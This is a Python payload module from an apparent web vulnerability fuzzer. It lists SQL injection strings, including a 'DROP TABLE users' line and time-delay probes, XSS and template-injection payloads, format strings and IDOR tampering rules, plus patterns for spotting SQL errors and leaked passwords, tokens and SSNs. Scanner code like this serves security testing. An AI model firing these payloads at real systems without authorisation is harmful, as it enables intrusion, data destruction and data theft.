from fuzzer.models import VulnType

SQL_INJECTION_PAYLOADS = [
    "' OR 1=1--",
    "' OR '1'='1",
    "\" OR \"\"=\"",
    "1' OR '1'='1",
    "' OR 1=1#",
    "' OR 1=1/*",
    "1; DROP TABLE users--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1 OR 1=1",
    "' OR '1'='1'--",
    "admin'--",
    "1; WAITFOR DELAY '0:0:5'--",
    "1 AND 1=1",
    "1 AND 1=2",
    "' AND SUBSTRING(@@VERSION,1,1)='M'",
    "1' AND SLEEP(5)--",
    "'||'",
    "' AND 1=1--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\">",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "\"><script>alert(1)</script>",
    "'-alert(1)-'",
    "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src=1>\">",
    "{{7*7}}",
    "${7*7}",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<ScRiPt>alert(1)</ScRiPt>",
]

IDOR_PAYLOADS = {
    "numeric_id": [
        {"action": "increment", "offset": 1},
        {"action": "increment", "offset": 100},
        {"action": "decrement", "offset": 1},
        {"action": "set_zero", "value": 0},
        {"action": "set_negative", "value": -1},
        {"action": "set_large", "value": 999999},
    ]
}

PARAM_POLLUTION_PAYLOADS = {
    "duplicate": True,
    "oversized": "A" * 10000,
    "null_byte": "value\x00injected",
    "special_chars": [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%=7*7%>",
        "{{constructor.constructor('return this')()}}",
        "__proto__",
        "constructor",
        "prototype",
    ],
    "format_strings": [
        "%s%s%s%s%s",
        "%d%d%d%d%d",
        "%n%n%n%n%n",
        "%x%x%x%x%x",
    ],
    "unicode_tricks": [
        "⁦⁩⁦⁩",
        "\ufeffpayload",
        "‮payload",
    ],
}

VULN_PATTERNS = {
    VulnType.SQL_INJECTION: {
        "error_patterns": [
            "sql syntax",
            "mysql",
            "postgresql",
            "sqlite",
            "oracle",
            "microsoft sql server",
            "odbc",
            "sqlstate",
            "syntax error",
            "unclosed quotation mark",
            "unterminated string",
            "union select",
            "invalid sql",
            "sql error",
            "sqlexception",
            "pdoexception",
            "mysql2::error",
            "pg::error",
            "activerecord",
            "sqlalchemy",
        ],
    },
    VulnType.XSS: {
        "reflection_patterns": [
            "<script>",
            "<script>alert(1)</script>",
            "onerror=alert(1)",
            "onload=alert(1)",
            "ontoggle=alert(1)",
            "javascript:alert(1)",
            "<svg onload",
            "<img src=x onerror",
        ],
    },
    VulnType.IDOR: {
        "status_changes": [
            {"from": 403, "to": 200},
            {"from": 404, "to": 200},
            {"from": 403, "to": 404},
        ],
        "data_leak_patterns": [
            "email",
            "password",
            "token",
            "secret",
            "private",
            "ssn",
            "credit_card",
        ],
    },
    VulnType.PARAM_POLLUTION: {
        "error_patterns": [
            "stack trace",
            "traceback",
            "exception",
            "internal server error",
            "runtimeerror",
            "typeerror",
            "referenceerror",
            "syntaxerror",
            "heap",
            "buffer overflow",
            "maximum recursion",
            "out of memory",
        ],
    },
}


def get_payloads_for_type(vuln_type: VulnType) -> list:
    if vuln_type == VulnType.SQL_INJECTION:
        return SQL_INJECTION_PAYLOADS
    elif vuln_type == VulnType.XSS:
        return XSS_PAYLOADS
    elif vuln_type == VulnType.PARAM_POLLUTION:
        payloads = [PARAM_POLLUTION_PAYLOADS["oversized"], PARAM_POLLUTION_PAYLOADS["null_byte"]]
        payloads.extend(PARAM_POLLUTION_PAYLOADS["special_chars"])
        payloads.extend(PARAM_POLLUTION_PAYLOADS["format_strings"])
        payloads.extend(PARAM_POLLUTION_PAYLOADS["unicode_tricks"])
        return payloads
    return []
